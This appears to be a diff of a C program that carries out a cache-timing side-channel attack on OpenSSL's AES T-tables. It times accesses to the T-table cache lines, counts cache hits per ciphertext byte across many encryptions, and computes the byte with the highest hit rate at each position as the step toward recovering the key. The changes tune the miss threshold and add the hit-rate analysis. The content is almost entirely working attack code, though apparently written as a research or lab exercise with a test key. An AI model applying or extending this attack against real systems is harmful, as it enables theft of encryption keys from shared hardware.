@@ -18,16 +18,31 @@
 
 //cache miss threshold, access time > threshold => cache miss
 /*** SET THESE ADDRESSES FOR SYSTEM BEFORE RUNNING ***/
-#define CACHE_MISS (225)
+#define CACHE_MISS (355)
 
 
 int main(int argc, char **argv) {
   srand(time(NULL));
 
   //uint64_t num_addresses_tested = (TABLE_SIZE*4)/CACHE_LINESIZE;
+  double hit_rate[TXT_BYTES][256];
+
+  for (int i = 0; i < 16; ++i) {
+    for (int ii = 0; ii < 256; ++ii) {
+      hit_rate[i][ii] = 0;
+    }
+  }
 
   //suppose we don't need to keep track of which cacheline was actually hit on, just which ciphertext bytes in relative positions get most hits
-  unsigned int hits_per_byte[TXT_BYTES][256];
+  unsigned int *hits_per_byte = calloc(TXT_BYTES*256, sizeof(unsigned int));
+  if (!hits_per_byte) {
+    return 1;
+  }
+  uint64_t *encryptions_per_byte = calloc(TXT_BYTES*256, sizeof(uint64_t));
+  if (!encryptions_per_byte) {
+    free(hits_per_byte);
+    return 1;
+  }
 
   //key init, something easy to check
   const unsigned char key[] =
@@ -45,7 +60,7 @@ int main(int argc, char **argv) {
   //set addresses of T-tables (must be done by observing memory in debugger), see mem_locs.png
 
   //ALSO! if ./extract: error while loading shared libraries: libcrypto.so.1.1: cannot open shared object file: No such file or directory
-  //error do this:
+  //do this:
   //export LD_LIBRARY_PATH=/usr/local/lib
 
   ADDR_PTR te0, te1, te2, te3;
@@ -98,13 +113,18 @@ int main(int argc, char **argv) {
         CYCLES acc_time = maccess_t(test_addr);
         if (acc_time < CACHE_MISS) {
           //printf(GREEN "        HIT " RESET " INDEXING TO %d\n", (CACHELINES_PER_TABLE * 0) + (ii/64));
-          hits_per_byte[2][ciphertxt[2]] += 1;
-          hits_per_byte[6][ciphertxt[6]] += 1;
-          hits_per_byte[10][ciphertxt[10]] += 1;
-          hits_per_byte[14][ciphertxt[14]] += 1;
+          hits_per_byte[2*256 + ciphertxt[2]] += 1;
+          hits_per_byte[6*256 + ciphertxt[6]] += 1;
+          hits_per_byte[10*256 + ciphertxt[10]] += 1;
+          hits_per_byte[14*256 + ciphertxt[14]] += 1;
         } else {
           //printf(RED "        MISS " RESET "%lu\n", acc_time);
         }
+
+        encryptions_per_byte[2*256 + ciphertxt[2]] += 1;
+        encryptions_per_byte[6*256 + ciphertxt[6]] += 1;
+        encryptions_per_byte[10*256 + ciphertxt[10]] += 1;
+        encryptions_per_byte[14*256 + ciphertxt[14]] += 1;
 
       }
       
@@ -128,13 +148,19 @@ int main(int argc, char **argv) {
         CYCLES acc_time = maccess_t(test_addr);
         if (acc_time < CACHE_MISS) {
           //printf(GREEN "        HIT " RESET " INDEXING TO %d\n", (CACHELINES_PER_TABLE * 1) + (ii/64));
-          hits_per_byte[3][ciphertxt[3]] += 1;
-          hits_per_byte[7][ciphertxt[7]] += 1;
-          hits_per_byte[11][ciphertxt[11]] += 1;
-          hits_per_byte[15][ciphertxt[15]] += 1;
+          hits_per_byte[3*256 + ciphertxt[3]] += 1;
+          hits_per_byte[7*256 + ciphertxt[7]] += 1;
+          hits_per_byte[11*256 + ciphertxt[11]] += 1;
+          hits_per_byte[15*256 + ciphertxt[15]] += 1;
+
         } else {
           //printf(RED "        MISS " RESET "%lu\n", acc_time);
         }
+
+        encryptions_per_byte[3*256 + ciphertxt[3]] += 1;
+        encryptions_per_byte[7*256 + ciphertxt[7]] += 1;
+        encryptions_per_byte[11*256 + ciphertxt[11]] += 1;
+        encryptions_per_byte[15*256 + ciphertxt[15]] += 1;
 
       }
 
@@ -157,13 +183,19 @@ int main(int argc, char **argv) {
         CYCLES acc_time = maccess_t(test_addr);
         if (acc_time < CACHE_MISS) {
           //printf(GREEN "        HIT " RESET " INDEXING TO %d\n", (CACHELINES_PER_TABLE * 2) + (ii/64));
-          hits_per_byte[0][ciphertxt[0]] += 1;
-          hits_per_byte[4][ciphertxt[4]] += 1;
-          hits_per_byte[8][ciphertxt[8]] += 1;
-          hits_per_byte[12][ciphertxt[12]] += 1;
+          hits_per_byte[0*256 + ciphertxt[0]] += 1;
+          hits_per_byte[4*256 + ciphertxt[4]] += 1;
+          hits_per_byte[8*256 + ciphertxt[8]] += 1;
+          hits_per_byte[12*256 + ciphertxt[12]] += 1;
+
         } else {
           //printf(RED "        MISS " RESET "%lu\n", acc_time);
         }
+
+        encryptions_per_byte[0*256 + ciphertxt[0]] += 1;
+        encryptions_per_byte[4*256 + ciphertxt[4]] += 1;
+        encryptions_per_byte[8*256 + ciphertxt[8]] += 1;
+        encryptions_per_byte[12*256 + ciphertxt[12]] += 1;
 
       }
 
@@ -186,19 +218,54 @@ int main(int argc, char **argv) {
         CYCLES acc_time = maccess_t(test_addr);
         if (acc_time < CACHE_MISS) {
           //printf(GREEN "        HIT " RESET " INDEXING TO %d\n", (CACHELINES_PER_TABLE * 3) + (ii/64));
-          hits_per_byte[1][ciphertxt[1]] += 1;
-          hits_per_byte[5][ciphertxt[5]] += 1;
-          hits_per_byte[9][ciphertxt[9]] += 1;
-          hits_per_byte[13][ciphertxt[13]] += 1;
+          hits_per_byte[1*256 + ciphertxt[1]] += 1;
+          hits_per_byte[5*256 + ciphertxt[5]] += 1;
+          hits_per_byte[9*256 + ciphertxt[9]] += 1;
+          hits_per_byte[13*256 + ciphertxt[13]] += 1;
+
         } else {
           //printf(RED "        MISS " RESET "%lu\n", acc_time);
         }
 
+        encryptions_per_byte[1*256 + ciphertxt[1]] += 1;
+        encryptions_per_byte[5*256 + ciphertxt[5]] += 1;
+        encryptions_per_byte[9*256 + ciphertxt[9]] += 1;
+        encryptions_per_byte[13*256 + ciphertxt[13]] += 1;
+
       }
   }
 
-  //
+  for (int i = 0; i < 16; ++i) {
+    for (int ii = 0; ii < 256; ++ii) {
+      //printf("BYTE %d at POSITION %d: HIT RATE %f HITS: %u ENCS: %lu\n", ii, i, (double) hits_per_byte[i*256 + ii]/encryptions_per_byte[i*256 + ii], hits_per_byte[i*256 + ii], encryptions_per_byte[i*256 + ii]);
+      hit_rate[i][ii] = (double) hits_per_byte[i*256 + ii]/encryptions_per_byte[i*256 + ii];
+    }
+  }
 
+  free(hits_per_byte);
+  free(encryptions_per_byte);
+
+  //get maximum hit rate for each ciphertext position
+  unsigned int max_bytes[TXT_BYTES];
+
+  for (int i = 0; i < 16; ++i) {
+    double max = 0;
+    unsigned int max_pos = -1;
+
+    for (int ii = 0; ii < 256; ++ii) {
+      if (hit_rate[i][ii] > max) {
+        max = hit_rate[i][ii];
+        max_pos = ii;
+      }
+    }
+    if (max_pos == -1) {
+      printf("sorting went wrong dude\n");
+    } else {
+      max_bytes[i] = max_pos;
+    }
+
+    printf("Max hit rate at position %u: %f and ciphertext byte is %u\n", i , max, max_pos);
+  }
 
   close(aes);
   munmap(start, map_size);
